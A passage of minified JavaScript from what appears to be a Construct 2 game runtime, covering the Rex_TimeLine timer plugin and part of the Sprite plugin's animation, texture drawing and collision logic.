            if (this.updateMode = this.properties[0], this.ManualMode = 0 === this.updateMode, this.GameTimeMode = 1 === this.updateMode, this.RealTimeMode = 2 === this.updateMode, this.updateManually = this.ManualMode, this.updateWithGameTime = this.GameTimeMode, this.updateWithRealTime = this.RealTimeMode, this.RealTimeMode) {
                var t = new Date;
                this.lastRealTime = t.getTime()
            } else this.lastRealTime = null;
            this.my_timescale = -1, this.timeline = new cr.plugins_.Rex_TimeLine.TimeLine, (this.GameTimeMode || this.RealTimeMode) && this.runtime.tickMe(this), this.check_name = "TIMELINE", this.recycled || (this.timers = {}), this.timerCache = cr.plugins_.Rex_TimeLine.timerCache, this.exp_triggeredTimerName = "", this.timersSave = null, this.c2FnType = null
        }, n.onDestroy = function () {
            var t;
            for (t in this.timeline.CleanAll(), this.timers) this.destroyLocalTimer(t)
        }, n.tick = function () {
            if (this.GameTimeMode) {
                if (this.updateWithGameTime) {
                    var t = this.runtime.getDt(this);
                    this.timeline.Dispatch(t)
                }
            } else if (this.RealTimeMode) {
                var e = (new Date).getTime();
                if (this.updateWithRealTime) {
                    t = (e - this.lastRealTime) / 1e3;
                    this.timeline.Dispatch(t)
                }
                this.lastRealTime = e
            }
        }, n.CreateTimer = function (t) {
            var e = new cr.plugins_.Rex_TimeLine.Timer(this.timeline);
            return e.TimeoutHandlerSet(t), e
        }, n.LinkTimer = function (t) {
            return t.Reset(this.timeline), t
        }, n.LoadTimer = function (t, e) {
            var i = this.CreateTimer(e);
            return i.loadFromJSON(t), i.afterLoad(), i
        }, n.getC2FnType = function (t) {
            return null === this.c2FnType && (window.c2_callRexFunction2 ? this.c2FnType = "c2_callRexFunction2" : window.c2_callFunction ? this.c2FnType = "c2_callFunction" : this.c2FnType = ""), this.c2FnType
        }, n.RunCallback = function (t, e, i) {
            var n = this.getC2FnType(i);
            return "" === n ? null : window[n](t, e)
        }, n.TimeGet = function () {
            return this.timeline.absTime
        }, n.create_local_timer = function (t) {
            var e = this.timers[t];
            return null != e ? e.Remove() : ((e = this.timerCache.alloc(this, r)).plugin = this, this.timers[t] = e), e
        }, n.destroyLocalTimer = function (t) {
            var e = this.timers[t];
            null != e && (e.Remove(), delete this.timers[t], this.timerCache.free(e))
        }, n.timer_cache_clean = function () {
            this.timerCache.lines.length = 0
        };
        var r = function () {
            var t = this.plugin;
            t.exp_triggeredTimerName = this._cb.name;
            var e = this._cb.command,
                i = this._cb.params;
            t.RunCallback(e, i, !0), 0 === this._repeat_count ? this.Start() : this._repeat_count > 1 && (this._repeat_count -= 1, this.Start())
        };

        function s() {}

        function o() {}

        function a() {}
        n._get_timer_cb_params = function (t) {
            return {
                name: t,
                command: "",
                params: []
            }
        }, n.saveToJSON = function () {
            var t, e, i = {};
            for (t in this.timers) e = this.timers[t], i[t] = {
                tim: e.saveToJSON(),
                cmd: e._cb.command,
                pams: e._cb.params,
                rc: e._repeat_count
            };
            return {
                ts: this.my_timescale,
                ug: this.updateWithGameTime,
                tl: this.timeline.saveToJSON(),
                timers: i,
                lrt: this.lastRealTime,
                ft: this.c2FnType
            }
        }, n.loadFromJSON = function (t) {
            this.my_timescale = t.ts, this.timeline.loadFromJSON(t.tl), this.timersSave = t.timers, this.lastRealTime = t.lrt, this.c2FnType = t.ft, this.onDestroy(), this.timer_cache_clean()
        }, n.afterLoad = function () {
            var t, e, i;
            for (t in this.timersSave) e = this.timersSave[t], (i = this.LoadTimer(e.tim, r)).plugin = this, i._cb = this._get_timer_cb_params(t), i._cb.command = e.cmd, i._cb.params = e.pams, i._repeat_count = e.rc;
            this.timersSave = null
        }, i.cnds = new s, s.prototype.IsRunning = function (t) {
            var e = this.timers[t];
            return !!e && e.IsActive()
        }, i.acts = new o, o.prototype.PushTimeLine = function (t) {
            this.updateManually && this.timeline.Dispatch(t)
        }, o.prototype.Setup_deprecated = function () {}, o.prototype.CreateTimer_deprecated = function () {}, o.prototype.StartTimer = function (t, e, i) {
            var n = this.timers[t];
            n && (n._repeat_count = i, n.Start(e))
        }, o.prototype.StartTrgTimer = function (t) {
            var e = this.exp_triggeredTimerName,
                i = this.timers[e];
            i && i.Start(t)
        }, o.prototype.PauseTimer = function (t) {
            var e = this.timers[t];
            e && e.Suspend()
        }, o.prototype.ResumeTimer = function (t) {
            var e = this.timers[t];
            e && e.Resume()
        }, o.prototype.StopTimer = function (t) {
            var e = this.timers[t];
            e && e.Remove()
        }, o.prototype.CleanTimeLine = function () {
            this.timeline.CleanAll()
        }, o.prototype.DeleteTimer = function (t) {
            this.destroyLocalTimer(t)
        }, o.prototype.SetTimerParameter = function (t, e, i) {
            var n = this.timers[t];
            n && (n._cb.params[e] = i)
        }, o.prototype.PauseTimeLine = function () {
            this.GameTimeMode ? this.updateWithGameTime = !1 : this.RealTimeMode && (this.updateWithRealTime = !1)
        }, o.prototype.ResumeTimeLine = function () {
            this.GameTimeMode ? this.updateWithGameTime = !0 : this.RealTimeMode && (this.updateWithRealTime = !0)
        }, o.prototype.CreateTimer = function (t, e, i) {
            var n = this.create_local_timer(t);
            n._cb = this._get_timer_cb_params(t), n._cb.command = e, cr.shallowAssignArray(n._cb.params, i)
        }, o.prototype.SetTimerParameters = function (t, e) {
            var i = this.timers[t];
            i && cr.shallowAssignArray(i._cb.params, e)
        }, o.prototype.SetTrgTimerParameters = function (t) {
            var e = this.exp_triggeredTimerName,
                i = this.timers[e];
            i && cr.shallowAssignArray(i._cb.params, t)
        }, o.prototype.DeleteTrgTimer = function () {
            this.destroyLocalTimer(this.exp_triggeredTimerName)
        }, o.prototype.PushTimeLineTo = function (t) {
            if (this.updateManually) {
                var e = t - this.timeline.absTime;
                e < 0 || this.timeline.Dispatch(e)
            }
        }, o.prototype.SetupCallback = function (t) {
            this.c2FnType = 0 === t ? "c2_callFunction" : "c2_callRexFunction2"
        }, i.exps = new a, a.prototype.TimerRemainder = function (t, e) {
            var i = this.timers[e],
                n = i ? i.RemainderTimeGet() : 0;
            t.set_float(n)
        }, a.prototype.TimerElapsed = function (t, e) {
            var i = this.timers[e],
                n = i ? i.ElapsedTimeGet() : 0;
            t.set_float(n)
        }, a.prototype.TimerRemainderPercent = function (t, e) {
            var i = this.timers[e],
                n = i ? i.RemainderTimePercentGet() : 0;
            t.set_float(n)
        }, a.prototype.TimerElapsedPercent = function (t, e) {
            var i = this.timers[e],
                n = i ? i.ElapsedTimePercentGet() : 0;
            t.set_float(n)
        }, a.prototype.TimeLineTime = function (t) {
            t.set_float(this.timeline.absTime)
        }, a.prototype.TriggeredTimerName = function (t) {
            t.set_string(this.exp_triggeredTimerName)
        }, a.prototype.TimerDelayTime = function (t) {
            var e = this.timers[timer_name],
                i = e ? e.DelayTimeGet() : 0;
            t.set_float(i)
        }
    }(),
    function () {
        cr.plugins_.Rex_TimeLine.TimeLine = function () {
            this.CleanAll()
        };
        var t = cr.plugins_.Rex_TimeLine.TimeLine.prototype,
            e = function (t, e) {
                var i = t.absTime,
                    n = e.absTime;
                return i < n ? -1 : i > n ? 1 : 0
            };
        t.CleanAll = function () {
            this.triggered_timer = null, this.absTime = 0, this._timer_absTime = 0, this._waitingTimerQueue = [], this._processTimerQueue = [], this._suspendTimerQueue = [], this._activateQueue = [this._waitingTimerQueue, this._processTimerQueue], this._allQueues = [this._waitingTimerQueue, this._processTimerQueue, this._suspendTimerQueue]
        }, t.CurrentTimeGet = function () {
            return this._timer_absTime
        }, t.RegistTimer = function (t) {
            this._add_timer_to_activate_lists(t)
        }, t.RemoveTimer = function (t) {
            this._removeTimerFromQueues(t, !1), t._idle()
        }, t.Dispatch = function (t) {
            this.absTime += t, this._waitingTimerQueue.sort(e);
            var i, n, r = this._waitingTimerQueue.length,
                s = 0;
            for (i = 0; i < r; i++) 
			{
				n = this._waitingTimerQueue[i];
				if (this._is_timer_time_out(n))
				{
					this._processTimerQueue.push(n); 
					s += 1;
				}
			}
            if (s) {
                for (i = s; i < r; i++) this._waitingTimerQueue[i - s] = this._waitingTimerQueue[i];
                this._waitingTimerQueue.length -= s
            }
            for (; this._processTimerQueue.length > 0;) this._processTimerQueue.sort(e), this.triggered_timer = this._processTimerQueue.shift(), this._timer_absTime = this.triggered_timer.absTime, this.triggered_timer.DoHandle();
            this._timer_absTime = this.absTime
        }, t.SuspendTimer = function (t) {
            var e = this._removeTimerFromQueues(t, !0);
            return e && (this._suspendTimerQueue.push(t), t.__suspend__()), e
        }, t.ResumeTimer = function (t) {
            var e = !1,
                i = this._suspendTimerQueue.indexOf(t);
            return -1 != i && (cr.arrayRemove(this._suspendTimerQueue, i), t.__resume__(), this.RegistTimer(t), e = !0), e
        }, t.SetTimescale = function (t, e) {
            t.__setTimescale__(e);
            var i = this._removeTimerFromQueues(t, !0);
            return i && this.RegistTimer(t), i
        }, t.ChangeTimerRate = function (t, e) {
            t.__changeRate__(e);
            var i = this._removeTimerFromQueues(t, !0);
            return i && this.RegistTimer(t), i
        }, t.saveToJSON = function () {
            return {
                at: this.absTime
            }
        }, t.loadFromJSON = function (t) {
            this.absTime = t.at
        }, t._is_timer_time_out = function (t) {
            return t.absTime <= this.absTime
        }, t._add_timer_to_activate_lists = function (t) {
            (this._is_timer_time_out(t) ? this._processTimerQueue : this._waitingTimerQueue).push(t)
        }, t._removeTimerFromQueues = function (t, e) {
            var i, n, r, s = !1,
                o = e ? this._activateQueue : this._allQueues,
                a = o.length;
            for (i = 0; i < a; i++)
                if (-1 != (r = (n = o[i]).indexOf(t))) {
                    cr.arrayRemove(n, r), s = !0;
                    break
                } return s
        }, cr.plugins_.Rex_TimeLine.Timer = function (t) {
            this.Reset(t), this.extra = {}
        };
        var i = cr.plugins_.Rex_TimeLine.Timer.prototype;
        i.Reset = function (t) {
            this.timeline = t, this.delayTime = 0, this._remainderTime = 0, this.absTime = 0, this.timescale = 1, this._idle(), this._setAbsTimeout(0)
        }, i.Restart = function (t) {
            null != t && (this.delayTime = t);
            var e = this.delayTime / this.timescale;
            this._setAbsTimeout(e), this._isAlive ? this._isActive || (this._remainderTime = this.absTime, this.Resume()) : (this.timeline.RegistTimer(this), this._run())
        }, i.Start = i.Restart, i.Suspend = function () {
            this.timeline.SuspendTimer(this)
        }, i.Resume = function () {
            this.timeline.ResumeTimer(this)
        }, i.SetTimescale = function (t) {
            this._isActive && t === this.timescale || this.timeline.SetTimescale(this, t)
        }, i.ChangeRate = function (t) {
            this.timeline.ChangeTimerRate(this, t)
        }, i.Remove = function () {
            this._isAlive && this.timeline.RemoveTimer(this)
        }, i.IsAlive = function () {
            return this._isAlive
        }, i.IsActive = function () {
            return this._isAlive && this._isActive
        }, i.RemainderTimeGet = function (t) {
            var e;
            return e = this.IsActive() ? this.absTime - this.timeline.CurrentTimeGet() : this.IsAlive() ? this._remainderTime : 0, t || 0 === this.timescale && 1 === this.timescale || (e *= this.timescale), e
        }, i.RemainderTimeSet = function (t) {
            if (this.IsAlive()) {
                var e = this.delayTime;
                0 === this.timescale && 1 === this.timescale || (e /= this.timescale), this._remainderTime = cr.clamp(t, 0, e), this.absTime = this.timeline.CurrentTimeGet() + this._remainderTime
            }
        }, i.ElapsedTimeGet = function () {
            return this.delayTime - this.RemainderTimeGet()
        }, i.RemainderTimePercentGet = function () {
            return 0 == this.delayTime ? 0 : this.RemainderTimeGet() / this.delayTime
        }, i.ElapsedTimePercentGet = function () {
            return 0 == this.delayTime ? 0 : this.ElapsedTimeGet() / this.delayTime
        }, i.ExpiredTimeGet = function () {
            return this.timeline.absTime - this.absTime
        }, i.DelayTimeGet = function () {
            return this.delayTime
        }, i.TimeoutHandlerSet = function (t) {
            this.OnTimeout = t
        }, i.DoHandle = function () {
            this._idle(), this.OnTimeout && this.OnTimeout()
        }, i.saveToJSON = function () {
            var t = this.RemainderTimeGet(!0);
            return {
                dt: this.delayTime,
                rt: t,
                ts: this.timescale,
                alive: this._isAlive,
                active: this._isActive,
                ex: this.extra
            }
        }, i.loadFromJSON = function (t) {
            this.delayTime = t.dt, this._isAlive = t.alive, this._isActive = t.active, this.timescale = t.ts, this.extra = t.ex, this.RemainderTimeSet(t.rt)
        }, i.afterLoad = function () {
            this.IsAlive() && (this.timeline.RegistTimer(this), this.IsActive() || this.timeline.SuspendTimer(this))
        }, i._idle = function () {
            this._isAlive = !1, this._isActive = !1
        }, i._run = function () {
            this._isAlive = !0, this._isActive = !0
        }, i._setAbsTimeout = function (t) {
            this.absTime = this.timeline.CurrentTimeGet() + t
        }, i.__suspend__ = function () {
            this._remainderTime = this.absTime - this.timeline.CurrentTimeGet(), this._isActive = !1
        }, i.__resume__ = function () {
            this._setAbsTimeout(this._remainderTime), this._isActive = !0
        }, i.__setTimescale__ = function (t) {
            if (!(t < 0)) {
                var e = !1;
                if (0 == t && this._isActive ? this.Suspend() : t > 0 && !this._isActive ? (this.Resume(), e = !0) : t > 0 && this._isActive && (e = !0), e) {
                    var i = this.timescale / t;
                    this.__changeRate__(i), this.timescale = t
                }
            }
        }, i.__changeRate__ = function (t) {
            if (this._isActive) {
                var e = this.timeline.CurrentTimeGet(),
                    i = this.absTime - e;
                this.absTime = e + i * t
            } else this._remainderTime *= t
        }
    }(), cr.plugins_.Sprite = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Sprite.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        };
        var e = t.Type.prototype;

        function i() {
            if (0 === this.datauri.length) {
                var t = document.createElement("canvas");
                t.width = this.width, t.height = this.height;
                var e = t.getContext("2d");
                this.spritesheeted ? e.drawImage(this.texture_img, this.offx, this.offy, this.width, this.height, 0, 0, this.width, this.height) : e.drawImage(this.texture_img, 0, 0, this.width, this.height), this.datauri = t.toDataURL("image/png")
            }
            return this.datauri
        }
        e.onCreate = function () {
            var t, e, n, r, s, o, a, h, c, l;
            if (!this.is_family)
                for (this.all_frames = [], this.has_loaded_textures = !1, t = 0, e = this.animations.length; t < e; t++) {
                    for (s = this.animations[t], (a = {}).name = s[0], a.speed = s[1], a.loop = s[2], a.repeatcount = s[3], a.repeatto = s[4], a.pingpong = s[5], a.sid = s[6], a.frames = [], n = 0, r = s[7].length; n < r; n++) o = s[7][n], (h = {}).texture_file = o[0], h.texture_filesize = o[1], h.offx = o[2], h.offy = o[3], h.width = o[4], h.height = o[5], h.duration = o[6], h.hotspotX = o[7], h.hotspotY = o[8], h.image_points = o[9], h.poly_pts = o[10], h.pixelformat = o[11], h.spritesheeted = 0 !== h.width, h.datauri = "", h.getDataUri = i, (l = {}).left = 0, l.top = 0, l.right = 1, l.bottom = 1, h.sheetTex = l, h.webGL_texture = null, (c = this.runtime.findWaitingTexture(o[0])) ? h.texture_img = c : (h.texture_img = new Image, h.texture_img.cr_src = o[0], h.texture_img.cr_filesize = o[1], h.texture_img.c2webGL_texture = null, this.runtime.waitForImageLoad(h.texture_img, o[0])), cr.seal(h), a.frames.push(h), this.all_frames.push(h);
                    cr.seal(a), this.animations[t] = a
                }
        }, e.updateAllCurrentTexture = function () {
            var t, e, i;
            for (t = 0, e = this.instances.length; t < e; t++)(i = this.instances[t]).curWebGLTexture = i.curFrame.webGL_texture
        }, e.onLostWebGLContext = function () {
            if (!this.is_family) {
                var t, e, i;
                for (t = 0, e = this.all_frames.length; t < e; ++t)(i = this.all_frames[t]).texture_img.c2webGL_texture = null, i.webGL_texture = null;
                this.has_loaded_textures = !1, this.updateAllCurrentTexture()
            }
        }, e.onRestoreWebGLContext = function () {
            if (!this.is_family && this.instances.length) {
                var t, e, i;
                for (t = 0, e = this.all_frames.length; t < e; ++t)(i = this.all_frames[t]).webGL_texture = this.runtime.glwrap.loadTexture(i.texture_img, !1, this.runtime.linearSampling, i.pixelformat);
                this.updateAllCurrentTexture()
            }
        }, e.loadTextures = function () {
            if (!this.is_family && !this.has_loaded_textures && this.runtime.glwrap) {
                var t, e, i;
                for (t = 0, e = this.all_frames.length; t < e; ++t)(i = this.all_frames[t]).webGL_texture = this.runtime.glwrap.loadTexture(i.texture_img, !1, this.runtime.linearSampling, i.pixelformat);
                this.has_loaded_textures = !0
            }
        }, e.unloadTextures = function () {
            if (!this.is_family && !this.instances.length && this.has_loaded_textures) {
                var t, e, i;
                for (t = 0, e = this.all_frames.length; t < e; ++t) i = this.all_frames[t], this.runtime.glwrap.deleteTexture(i.webGL_texture), i.webGL_texture = null;
                this.has_loaded_textures = !1
            }
        };
        var n = [];
        e.preloadCanvas2D = function (t) {
            var e, i, r;
            for (cr.clearArray(n), e = 0, i = this.all_frames.length; e < i; ++e) r = this.all_frames[e].texture_img, -1 === n.indexOf(r) && (t.drawImage(r, 0, 0), n.push(r))
        }, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime;
            var e = this.type.animations[0].frames[0].poly_pts;
            this.recycled ? this.collision_poly.set_pts(e) : this.collision_poly = new cr.CollisionPoly(e)
        };
        var r = t.Instance.prototype;

        function s() {}
        r.onCreate = function () {
            this.visible = 0 === this.properties[0], this.isTicking = !1, this.inAnimTrigger = !1, this.collisionsEnabled = 0 !== this.properties[3], this.cur_animation = this.getAnimationByName(this.properties[1]) || this.type.animations[0], this.cur_frame = this.properties[2], this.cur_frame < 0 && (this.cur_frame = 0), this.cur_frame >= this.cur_animation.frames.length && (this.cur_frame = this.cur_animation.frames.length - 1);
            var t, e, i, n, r, s, o, a, h = this.cur_animation.frames[this.cur_frame];
            for (this.collision_poly.set_pts(h.poly_pts), this.hotspotX = h.hotspotX, this.hotspotY = h.hotspotY, this.cur_anim_speed = this.cur_animation.speed, this.cur_anim_repeatto = this.cur_animation.repeatto, 1 === this.type.animations.length && 1 === this.type.animations[0].frames.length || 0 === this.cur_anim_speed || (this.runtime.tickMe(this), this.isTicking = !0), this.recycled ? this.animTimer.reset() : this.animTimer = new cr.KahanAdder, this.frameStart = this.getNowTime(), this.animPlaying = !0, this.animRepeats = 0, this.animForwards = !0, this.animTriggerName = "", this.changeAnimName = "", this.changeAnimFrom = 0, this.changeAnimFrame = -1, this.type.loadTextures(), t = 0, e = this.type.animations.length; t < e; t++)
                for (i = 0, n = (r = this.type.animations[t]).frames.length; i < n; i++) 0 === (s = r.frames[i]).width && (s.width = s.texture_img.width, s.height = s.texture_img.height), s.spritesheeted && (a = s.texture_img, (o = s.sheetTex).left = s.offx / a.width, o.top = s.offy / a.height, o.right = (s.offx + s.width) / a.width, o.bottom = (s.offy + s.height) / a.height, 0 === s.offx && 0 === s.offy && s.width === a.width && s.height === a.height && (s.spritesheeted = !1));
            this.curFrame = this.cur_animation.frames[this.cur_frame], this.curWebGLTexture = this.curFrame.webGL_texture
        }, r.saveToJSON = function () {
            var t = {
                a: this.cur_animation.sid,
                f: this.cur_frame,
                cas: this.cur_anim_speed,
                fs: this.frameStart,
                ar: this.animRepeats,
                at: this.animTimer.sum,
                rt: this.cur_anim_repeatto
            };
            return this.animPlaying || (t.ap = this.animPlaying), this.animForwards || (t.af = this.animForwards), t
        }, r.loadFromJSON = function (t) {
            var e = this.getAnimationBySid(t.a);
            e && (this.cur_animation = e), this.cur_frame = t.f, this.cur_frame < 0 && (this.cur_frame = 0), this.cur_frame >= this.cur_animation.frames.length && (this.cur_frame = this.cur_animation.frames.length - 1), this.cur_anim_speed = t.cas, this.frameStart = t.fs, this.animRepeats = t.ar, this.animTimer.reset(), this.animTimer.sum = t.at, this.animPlaying = !t.hasOwnProperty("ap") || t.ap, this.animForwards = !t.hasOwnProperty("af") || t.af, t.hasOwnProperty("rt") ? this.cur_anim_repeatto = t.rt : this.cur_anim_repeatto = this.cur_animation.repeatto, this.curFrame = this.cur_animation.frames[this.cur_frame], this.curWebGLTexture = this.curFrame.webGL_texture, this.collision_poly.set_pts(this.curFrame.poly_pts), this.hotspotX = this.curFrame.hotspotX, this.hotspotY = this.curFrame.hotspotY
        }, r.animationFinish = function (t) {
            this.cur_frame = t ? 0 : this.cur_animation.frames.length - 1, this.animPlaying = !1, this.animTriggerName = this.cur_animation.name, this.inAnimTrigger = !0, this.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnAnyAnimFinished, this), this.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnAnimFinished, this), this.inAnimTrigger = !1, this.animRepeats = 0
        }, r.getNowTime = function () {
            return this.animTimer.sum
        }, r.tick = function () {
            this.animTimer.add(this.runtime.getDt(this)), this.changeAnimName.length && this.doChangeAnim(), this.changeAnimFrame >= 0 && this.doChangeAnimFrame();
            var t, e = this.getNowTime(),
                i = this.cur_animation,
                n = i.frames[this.cur_frame],
                r = n.duration / this.cur_anim_speed;
            this.animPlaying && e >= this.frameStart + r && (this.animForwards ? this.cur_frame++ : this.cur_frame--, this.frameStart += r, this.cur_frame >= i.frames.length && (i.pingpong ? (this.animForwards = !1, this.cur_frame = i.frames.length - 2) : i.loop ? this.cur_frame = this.cur_anim_repeatto : (this.animRepeats++, this.animRepeats >= i.repeatcount ? this.animationFinish(!1) : this.cur_frame = this.cur_anim_repeatto)), this.cur_frame < 0 && (i.pingpong ? (this.cur_frame = 1, this.animForwards = !0, i.loop || (this.animRepeats++, this.animRepeats >= i.repeatcount && this.animationFinish(!0))) : i.loop ? this.cur_frame = this.cur_anim_repeatto : (this.animRepeats++, this.animRepeats >= i.repeatcount ? this.animationFinish(!0) : this.cur_frame = this.cur_anim_repeatto)), this.cur_frame < 0 ? this.cur_frame = 0 : this.cur_frame >= i.frames.length && (this.cur_frame = i.frames.length - 1), e > this.frameStart + i.frames[this.cur_frame].duration / this.cur_anim_speed && (this.frameStart = e), t = i.frames[this.cur_frame], this.OnFrameChanged(n, t), this.runtime.redraw = !0)
        }, r.getAnimationByName = function (t) {
            var e, i, n;
            for (e = 0, i = this.type.animations.length; e < i; e++)
                if (n = this.type.animations[e], cr.equals_nocase(n.name, t)) return n;
            return null
        }, r.getAnimationBySid = function (t) {
            var e, i, n;
            for (e = 0, i = this.type.animations.length; e < i; e++)
                if ((n = this.type.animations[e]).sid === t) return n;
            return null
        }, r.doChangeAnim = function () {
            var t = this.cur_animation.frames[this.cur_frame],
                e = this.getAnimationByName(this.changeAnimName);
            this.changeAnimName = "", e && (cr.equals_nocase(e.name, this.cur_animation.name) && this.animPlaying || (this.cur_animation = e, this.cur_anim_speed = e.speed, this.cur_anim_repeatto = e.repeatto, this.cur_frame < 0 && (this.cur_frame = 0), this.cur_frame >= this.cur_animation.frames.length && (this.cur_frame = this.cur_animation.frames.length - 1), 1 === this.changeAnimFrom && (this.cur_frame = 0), this.animPlaying = !0, this.frameStart = this.getNowTime(), this.animForwards = !0, this.OnFrameChanged(t, this.cur_animation.frames[this.cur_frame]), this.runtime.redraw = !0))
        }, r.doChangeAnimFrame = function () {
            var t = this.cur_animation.frames[this.cur_frame],
                e = this.cur_frame;
            this.cur_frame = cr.floor(this.changeAnimFrame), this.cur_frame < 0 && (this.cur_frame = 0), this.cur_frame >= this.cur_animation.frames.length && (this.cur_frame = this.cur_animation.frames.length - 1), e !== this.cur_frame && (this.OnFrameChanged(t, this.cur_animation.frames[this.cur_frame]), this.frameStart = this.getNowTime(), this.runtime.redraw = !0), this.changeAnimFrame = -1
        }, r.OnFrameChanged = function (t, e) {
            var i, n, r, s = t.width,
                o = t.height,
                a = e.width,
                h = e.height;
            for (s != a && (this.width *= a / s), o != h && (this.height *= h / o), this.hotspotX = e.hotspotX, this.hotspotY = e.hotspotY, this.collision_poly.set_pts(e.poly_pts), this.set_bbox_changed(), this.curFrame = e, this.curWebGLTexture = e.webGL_texture, i = 0, n = this.behavior_insts.length; i < n; i++)(r = this.behavior_insts[i]).onSpriteFrameChanged && r.onSpriteFrameChanged(t, e);
            this.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnFrameChanged, this)
        }, r.draw = function (t) {
            t.globalAlpha = this.opacity;
            var e = this.curFrame,
                i = e.spritesheeted,
                n = e.texture_img,
                r = this.x,
                s = this.y,
                o = this.width,
                a = this.height;
            if (0 === this.angle && o >= 0 && a >= 0) r -= this.hotspotX * o, s -= this.hotspotY * a, this.runtime.pixel_rounding && (r = Math.round(r), s = Math.round(s)), i ? t.drawImage(n, e.offx, e.offy, e.width, e.height, r, s, o, a) : t.drawImage(n, r, s, o, a);
            else {
                this.runtime.pixel_rounding && (r = Math.round(r), s = Math.round(s)), t.save();
                var h = o > 0 ? 1 : -1,
                    c = a > 0 ? 1 : -1;
                t.translate(r, s), 1 === h && 1 === c || t.scale(h, c), t.rotate(this.angle * h * c);
                var l = 0 - this.hotspotX * cr.abs(o),
                    u = 0 - this.hotspotY * cr.abs(a);
                i ? t.drawImage(n, e.offx, e.offy, e.width, e.height, l, u, cr.abs(o), cr.abs(a)) : t.drawImage(n, l, u, cr.abs(o), cr.abs(a)), t.restore()
            }
        }, r.drawGL_earlyZPass = function (t) {
            this.drawGL(t)
        }, r.drawGL = function (t) {
            t.setTexture(this.curWebGLTexture), t.setOpacity(this.opacity);
            var e = this.curFrame,
                i = this.bquad;
            if (this.runtime.pixel_rounding) {
                var n = Math.round(this.x) - this.x,
                    r = Math.round(this.y) - this.y;
                e.spritesheeted ? t.quadTex(i.tlx + n, i.tly + r, i.trx + n, i.try_ + r, i.brx + n, i.bry + r, i.blx + n, i.bly + r, e.sheetTex) : t.quad(i.tlx + n, i.tly + r, i.trx + n, i.try_ + r, i.brx + n, i.bry + r, i.blx + n, i.bly + r)
            } else e.spritesheeted ? t.quadTex(i.tlx, i.tly, i.trx, i.try_, i.brx, i.bry, i.blx, i.bly, e.sheetTex) : t.quad(i.tlx, i.tly, i.trx, i.try_, i.brx, i.bry, i.blx, i.bly)
        }, r.getImagePointIndexByName = function (t) {
            var e, i, n = this.curFrame;
            for (e = 0, i = n.image_points.length; e < i; e++)
                if (cr.equals_nocase(t, n.image_points[e][0])) return e;
            return -1
        }, r.getImagePoint = function (t, e) {
            var i, n = this.curFrame,
                r = n.image_points;
            if (i = cr.is_string(t) ? this.getImagePointIndexByName(t) : t - 1, (i = cr.floor(i)) < 0 || i >= r.length) return e ? this.x : this.y;
            var s = (r[i][1] - n.hotspotX) * this.width,
                o = r[i][2];
            o = (o - n.hotspotY) * this.height;
            var a = Math.cos(this.angle),
                h = Math.sin(this.angle),
                c = s * a - o * h;
            return o = o * a + s * h, s = c, s += this.x, o += this.y, e ? s : o
        };
        var o = [];

        function a(t) {
            t[0] = 0, t[1] = 0, t[2] = 0, o.push(t)
        }

        function h(t, e) {
            return t < e ? t + "," + e : e + "," + t
        }

        function c(t, e, i, n) {
            var r = e.uid,
                s = i.uid,
                a = h(r, s);
            if (t.hasOwnProperty(a)) t[a][2] = n;
            else {
                var c = o.length ? o.pop() : [0, 0, 0];
                c[0] = r, c[1] = s, c[2] = n, t[a] = c
            }
        }

        function l(t, e, i) {
            var n = h(e.uid, i.uid);
            t.hasOwnProperty(n) && (a(t[n]), delete t[n])
        }
        var u = -2;

        function p(t, e, i) {
            var n = h(e.uid, i.uid);
            return t.hasOwnProperty(n) ? (u = t[n][2], !0) : (u = -2, !1)
        }
        var d = [];
        s.prototype.OnCollision = function (t) {
            if (!t) return !1;
            var e = this.runtime,
                i = e.getCurrentCondition(),
                n = i.type,
                r = null;
            i.extra.collmemory ? r = i.extra.collmemory : (r = {}, i.extra.collmemory = r), i.extra.spriteCreatedDestroyCallback || (i.extra.spriteCreatedDestroyCallback = !0, e.addDestroyCallback((function (t) {
                ! function (t, e) {
                    var i, n, r = e.uid;
                    for (i in t) t.hasOwnProperty(i) && ((n = t[i])[0] !== r && n[1] !== r || (a(t[i]), delete t[i]))
                }(i.extra.collmemory, t)
            })));
            var s, o, h, f, m, g, y, _, v = n.getCurrentSol(),
                b = t.getCurrentSol(),
                w = v.getObjects(),
                x = this.runtime.tickcount,
                S = x - 1,
                T = e.getCurrentEventStack().current_event;
            T.orblock;
            for (o = 0; o < w.length; o++) {
                for (h = w[o], b.select_all ? (h.update_bbox(), this.runtime.getCollisionCandidates(h.layer, t, h.bbox, d), s = d, this.runtime.addRegisteredCollisionCandidates(h, t, s)) : s = b.getObjects(), f = 0; f < s.length; f++) m = s[f], e.testOverlap(h, m) || e.checkRegisteredCollision(h, m) ? (_ = !p(r, h, m) || u < S, c(r, h, m, x), _ && (e.pushCopySol(T.solModifiers), g = n.getCurrentSol(), y = t.getCurrentSol(), g.select_all = !1, y.select_all = !1, n === t ? (g.instances.length = 2, g.instances[0] = h, g.instances[1] = m, n.applySolToContainer()) : (g.instances.length = 1, y.instances.length = 1, g.instances[0] = h, y.instances[0] = m, n.applySolToContainer(), t.applySolToContainer()), T.retrigger(), e.popSol(T.solModifiers))) : l(r, h, m);
                cr.clearArray(d)
            }
            return !1
        };
        var f = null,
            m = new cr.ObjectSet,
            g = !1,
            y = [],
            _ = new cr.rect(0, 0, 0, 0);

        function v(t, e, i) {
            if (!t) return !1;
            var n, r, s, o, a, h, c = 0 !== e || 0 !== i,
                l = !1,
                u = this.runtime.getCurrentCondition(),
                p = u.type,
                d = u.inverted,
                v = t.getCurrentSol(),
                b = this.runtime.getCurrentEventStack().current_event.orblock;
            for (v.select_all ? (this.update_bbox(), _.copy(this.bbox), _.offset(e, i), this.runtime.getCollisionCandidates(this.layer, t, _, y), h = y) : h = b ? this.runtime.isCurrentConditionFirst() && !v.else_instances.length && v.instances.length ? v.instances : v.else_instances : v.instances, f = t, g = p !== t && !d, c && (n = this.x, r = this.y, this.x += e, this.y += i, this.set_bbox_changed()), s = 0, o = h.length; s < o; s++)
                if (a = h[s], this.runtime.testOverlap(this, a)) {
                    if (l = !0, d) break;
                    p !== t && m.add(a)
                } return c && (this.x = n, this.y = r, this.set_bbox_changed()), cr.clearArray(y), l
        }

        function b() {}

        function w() {}
        e.finish = function (t) {
            if (g) {
                if (t) {
                    var e, i, n, r = this.runtime.getCurrentEventStack().current_event.orblock,
